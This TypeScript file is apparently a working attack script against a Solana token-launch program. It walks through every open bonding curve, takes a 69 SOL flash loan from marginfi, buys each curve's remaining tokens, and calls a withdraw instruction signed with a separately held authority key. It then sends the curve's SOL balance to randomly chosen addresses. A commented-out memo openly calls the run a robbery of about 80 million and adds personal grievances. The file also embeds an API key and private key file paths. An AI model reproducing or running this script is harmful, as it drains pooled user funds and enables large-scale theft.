// @ts-nocheck

import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Pump } from "../target/types/pump";
import { expect } from "chai";
import fs from "fs";

import fetch from "node-fetch";
import {
  TOKEN_PROGRAM_ID,
  createAssociatedTokenAccountInstruction,
  getAssociatedTokenAddressSync,
} from "@solana/spl-token";
const one = fs.readFileSync("/Users/staccoverflow/Downloads/1.json", "utf8");
const two = fs.readFileSync("/Users/staccoverflow/Downloads/2.json", "utf8");
const three = fs.readFileSync("/Users/staccoverflow/Downloads/3.json", "utf8");
const four = fs.readFileSync("/Users/staccoverflow/Downloads/4.json", "utf8");
const combinedList = [
  ...JSON.parse(one),
  ...JSON.parse(two),
  ...JSON.parse(three),
  ...JSON.parse(four),
];
console.log(combinedList.length);
import {
  AddressLookupTableAccount,
  AddressLookupTableProgram,
  ComputeBudgetProgram,
  Connection,
  Keypair,
  LAMPORTS_PER_SOL,
  TransactionInstruction,
} from "@solana/web3.js";
import { createJupiterApiClient } from "@jup-ag/api";
import { createMemoInstruction, nativeToUi } from "@mrgnlabs/mrgn-common";
import { Transaction, PublicKey, SystemProgram } from "@solana/web3.js";
import {
  MPL_TOKEN_METADATA_PROGRAM_ID,
  deserializeMetadata,
} from "@metaplex-foundation/mpl-token-metadata";
import { publicKey as metaplexPublicKey } from "@metaplex-foundation/umi";
import {
  bool,
  publicKey,
  struct,
  u64,
  u8,
  u32,
  Token,
} from "@raydium-io/raydium-sdk";
import { base64, bs58 } from "@coral-xyz/anchor/dist/cjs/utils/bytes";

export async function getMarginfiClient({
  wallet,
  connection,
}): Promise<MarginfiClient> {
  const config = getConfig("production");

  const client = await MarginfiClient.fetch(config, wallet, connection, {
    readOnly: false,
  });

  return client;
}

export const MINT_LAYOUT = struct([
  u32("mintAuthorityOption"),
  publicKey("mintAuthority"),
  u64("supply"),
  u8("decimals"),
  bool("isInitialized"),
  u32("freezeAuthorityOption"),
  publicKey("freezeAuthority"),
]);

import * as idl from "../target/idl/pump.json";
import { ASSOCIATED_PROGRAM_ID } from "@coral-xyz/anchor/dist/cjs/utils/token";
import {
  MarginfiClient,
  getConfig,
} from "../mrgn-ts/packages/marginfi-client-v2/dist";
// Configure the client to use the local cluster.
anchor.setProvider(anchor.AnchorProvider.env());
const program = new anchor.Program(
  idl as anchor.Idl,
  new anchor.web3.PublicKey("67LWrtDBPyZqS7SzCYZWBLgPBqZAG94GTfMWEBG2fnuV"),
  anchor.getProvider()
);
const user = program.provider;
const mintKeyPair = anchor.web3.Keypair.generate();
const [globalPDA] = anchor.web3.PublicKey.findProgramAddressSync(
  [anchor.utils.bytes.utf8.encode("global")],
  program.programId
);
const [bondingCurvePDA] = anchor.web3.PublicKey.findProgramAddressSync(
  [
    anchor.utils.bytes.utf8.encode("bonding-curve"),
    mintKeyPair.publicKey.toBuffer(),
  ],
  program.programId
);
const associatedBondingCurve = getAssociatedTokenAddressSync(
  mintKeyPair.publicKey,
  bondingCurvePDA,
  true
);
const associatedUser = getAssociatedTokenAddressSync(
  mintKeyPair.publicKey,
  user.publicKey,
  true
);

const API_URL =
  "https://programs.shyft.to/v0/graphql/?api_key=PjnsMufcmuJVt3E9";
const PAGE_SIZE = 1000; // Number of records per page

async function fetchGraphQL(operationsDoc, operationName, variables) {
  const result = await fetch(API_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      query: operationsDoc,
      variables: variables,
      operationName: operationName,
    }),
  });

  return await result.json();
}

const operationsDoc = `
    query MyQuery($limit: Int, $offset: Int) {
      pump_BondingCurve( where: {complete: {_nin: true}}, limit: $limit, offset: $offset, order_by: {realTokenReserves: asc}) {
        _lamports
        realSolReserves
        realTokenReserves
        tokenTotalSupply
        virtualSolReserves
        virtualTokenReserves
        complete
        pubkey
      }
    }
  `;

async function fetchMyQuery(limit, offset) {
  return fetchGraphQL(operationsDoc, "MyQuery", { limit, offset });
}

async function startFetchMyQuery() {
  const client = await getMarginfiClient({
    wallet: new anchor.Wallet(
      Keypair.fromSecretKey(
        new Uint8Array(
          JSON.parse(fs.readFileSync("/Users/staccoverflow/7i.json").toString())
        )
      )
    ),
    connection: program.provider.connection,
  });
  const marginfiAccounts = await client.getMarginfiAccountsForAuthority();
  if (marginfiAccounts.length === 0) throw Error("No marginfi account found");

  const marginfiAccount = marginfiAccounts[0];
  const lut = await program.provider.connection.getAddressLookupTable(
    new PublicKey("3GQUPuSA3mg2s7urjZkcBuBTZb7Dmct2YAWGHmdJK5wA")
  );
  // Assumption: account has enough USDC to repay the whole USDT borrow, accounting for slippage

  const bank = client.getBankByTokenSymbol("SOL");
  const global = await program.account.global.fetch(globalPDA);
  let offset = 0;
  let allData = [];
  let hasMoreData = true;

  while (hasMoreData) {
    const { errors, data } = await fetchMyQuery(PAGE_SIZE, offset);

    if (errors) {
      console.error(errors);
      break;
    }

    const fetchedData = data.pump_BondingCurve;
    if (fetchedData.length > 0) {
      for (const curve of fetchedData) {
        const bondingCurvePDA = new PublicKey(curve.pubkey);
        const bondingCurve = await program.account.bondingCurve.fetch(
          bondingCurvePDA
        );
        const buyAmount = bondingCurve.realTokenReserves;
        if (bondingCurve.complete) continue;
        const atas =
          await program.provider.connection.getParsedTokenAccountsByOwner(
            bondingCurvePDA,
            {
              programId: TOKEN_PROGRAM_ID,
            }
          );
        const mint = new PublicKey(atas.value[0].account.data.parsed.info.mint);

        const associatedBondingCurve = getAssociatedTokenAddressSync(
          mint,
          bondingCurvePDA,
          true
        );
        const associatedUser = getAssociatedTokenAddressSync(
          mint,
          user.publicKey,
          true
        );

        console.log(bondingCurve);
        const solCost = buyAmount
          .mul(bondingCurve.virtualSolReserves)
          .div(bondingCurve.virtualTokenReserves.sub(buyAmount))
          .add(new anchor.BN(1));
        const fee = solCost
          .mul(global.feeBasisPoints)
          .div(new anchor.BN(10000));
        console.log(buyAmount.toNumber());
        console.log(solCost.toNumber());
        console.log(fee.toNumber());
        // execute the buy
        const buy = await program.methods
          .buy(buyAmount, solCost.add(fee))
          .accounts({
            feeRecipient: global.feeRecipient,
            global: globalPDA,
            mint: mint,
            bondingCurve: bondingCurvePDA,
            associatedBondingCurve,
            associatedUser,
            user: user.publicKey,
          })
          .instruction();
        const bondingCurveSolBalanceBefore =
          await program.provider.connection.getBalance(bondingCurvePDA);

        const withdrawAuthorityKeyFile = "/Users/staccoverflow/w";
        const withdrawAuthorityKeyPair = anchor.web3.Keypair.fromSecretKey(
          new Uint8Array(
            JSON.parse(fs.readFileSync(withdrawAuthorityKeyFile).toString())
          )
        );
        const associatedUser2 = getAssociatedTokenAddressSync(
          mint,
          withdrawAuthorityKeyPair.publicKey,
          true
        );
        console.log(bondingCurveSolBalanceBefore);

        const withdrawAmount = nativeToUi(
          new anchor.BN(69 * LAMPORTS_PER_SOL),
          bank.mintDecimals
        );
        const borrowIx = await marginfiAccount.makeBorrowIx(
          withdrawAmount,
          bank.address
        );
        const depositIx = await marginfiAccount.makeRepayIx(
          withdrawAmount,
          bank.address,
          true
        );
        const magick = await program.methods
          .withdraw()
          .accounts({
            global: globalPDA,
            mint: mint,
            bondingCurve: bondingCurvePDA,
            associatedBondingCurve,
            associatedUser: associatedUser2,
            user: withdrawAuthorityKeyPair.publicKey,
          })
          .instruction();
        console.log(magick);

        const flashLoanTx = await marginfiAccount.buildFlashLoanTx({
          ixs: [
            ComputeBudgetProgram.setComputeUnitPrice({
              microLamports: 138000,
            }),
            ...borrowIx.instructions,
            createAssociatedTokenAccountInstruction(
              user.publicKey,
              associatedUser,
              user.publicKey,
              mint
            ),
            createAssociatedTokenAccountInstruction(
              user.publicKey,
              associatedUser2,
              withdrawAuthorityKeyPair.publicKey,
              mint
            ),
            buy,
            magick,
            SystemProgram.transfer({
              fromPubkey: withdrawAuthorityKeyPair.publicKey,
              toPubkey: new PublicKey(
                combinedList[Math.floor(Math.random() * combinedList.length)]
              ),
              lamports:
                bondingCurveSolBalanceBefore -
                3666000 -
                solCost.add(fee).toNumber(),
            }),
            SystemProgram.transfer({
              fromPubkey: withdrawAuthorityKeyPair.publicKey,
              toPubkey: user.publicKey,
              lamports: 2000000 + solCost.add(fee).toNumber(),
            }),
            ...depositIx.instructions,
            // createMemoInstruction(
            //  "And now; Magick: everybody be cool, this is a r o b b e r y. What it do, staccattack? I'm about to change the course of history. n then rot in jail. am I sane? nah. am I well? v much not. do I want for anything? my mom raised from the dead n barring that: life without parole. Sticking this here now: if stacc winds up dead, it was not a suicide :). I will tell you this: the kind of horrible bosses that witness you wreck your hand, ask you what happened, u said the glass table gotchu, and they go 'is that table ok?' is not the type of ppl you want front n center as the face of blockchain. The type of ppl that insist on custody of user funds 'hehe hehe' are not the types of people we want hodling any more of your millions. And so this wee lil script is sending the remaining balances of bonding curves via pRNG to: 1. slerf holders 2. stacc holders 3. saga holders 4. risklol holders. This ~80m airdrop may cause a solana fork n it may cause an awful lot of sourpuss rich kids everywhere but it certainly stops the evil here. Probably shoulda went for the bonuses, eh? and instead you face the day of the great canadian rake... coulda had some bonuses, ain't nobody hurt and ain't nobody cry. Shalom."
            // ),
          ],
          addressLookupTableAccounts: [lut.value],
          signers: [withdrawAuthorityKeyPair],
        });
        client.processTransaction(flashLoanTx);
      }
      offset += PAGE_SIZE;
    } else {
      hasMoreData = false;
    }
  }

  // do something great with this precious data
  console.log(allData);
}

startFetchMyQuery();
